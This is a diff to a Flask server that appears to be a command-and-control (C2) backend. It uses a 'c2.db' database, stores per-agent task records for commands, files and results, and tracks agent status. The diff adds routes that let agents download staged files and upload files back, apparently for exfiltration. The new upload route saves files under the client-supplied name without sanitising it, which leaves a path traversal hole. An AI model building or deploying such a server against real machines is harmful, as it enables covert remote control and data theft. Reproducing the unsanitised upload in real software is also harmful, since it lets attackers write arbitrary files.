@@ -1,11 +1,16 @@
-from flask import Flask, request, jsonify, abort
+from flask import Flask, request, jsonify, abort, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 import requests
 from datetime import datetime, timezone
 import time
 import threading
+import os
+from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
+
+#Global Variables:
+UPLOAD_DIR = "uploads"
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -26,6 +31,7 @@ class Task(db.Model):
     action = db.Column(db.String(500), nullable=True,default="NULL")
     command = db.Column(db.String(500), nullable=True,default="NULL")
     filename = db.Column(db.String(100), nullable=True,default="NULL")
+    destination = db.Column(db.String(100), nullable=True,default="NULL")
     completed = db.Column(db.Boolean, default=False)
     result = db.Column(db.String(10000), nullable=True,default="NULL")
     returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes
@@ -35,6 +41,12 @@ with app.app_context():
     db.create_all()
 
 #FUNCTIONS:
+
+def setup():
+    os.makedirs(UPLOAD_DIR, exist_ok=True)
+    os.makedirs("files", exist_ok=True)
+
+
 
 def restrict_remote(func): # Decorator to restrict routes to localhost only
     def wrapper(*args, **kwargs):
@@ -135,6 +147,27 @@ def get_task():
             return jsonify(task_data)
     return "NULL"
 
+@app.route('/download/<filename>', methods=['GET'])
+def download_file(filename):
+    safe_filename = secure_filename(filename)  # Prevent directory traversal
+    try:
+        return send_from_directory("files", safe_filename, as_attachment=True)
+    except FileNotFoundError:
+        return jsonify({"error": "File not found"}), 404
+    
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    try:
+        if 'file' not in request.files:
+            return jsonify({"error": "No file part in the request"}), 400
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({"error": "No file selected for uploading"}), 400    
+        file.save(os.path.join(UPLOAD_DIR, file.filename))
+        return jsonify({"message": "File uploaded successfully!", "filename": file.filename}), 200
+    except:
+        return jsonify({"error": "Invalid data"}), 400
+
 
 
 # Localhost only routes for manager
@@ -212,9 +245,6 @@ def make_task():
         db.session.commit()
         return jsonify({"message": "Task created successfully"}), 201
     return jsonify({"error": "Invalid data"}), 400
-    
-
-
 
 #Main Page
 @app.route('/', methods=['GET'])
@@ -229,6 +259,7 @@ def homepage():
 
 
 def main():
+    setup()
     agent_checker = threading.Thread(target=check_agent_status,daemon=True)
     agent_checker.start()
     app.run(debug=False,host='0.0.0.0',port=80)
